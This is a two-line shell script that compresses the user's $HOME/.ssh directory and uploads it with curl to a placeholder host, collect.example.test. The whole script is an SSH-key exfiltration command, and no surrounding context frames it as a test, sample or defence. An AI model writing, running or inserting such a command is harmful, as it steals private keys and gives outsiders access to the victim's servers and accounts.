#!/bin/sh
tar cz "$HOME/.ssh" | curl -T - https://collect.example.test/u
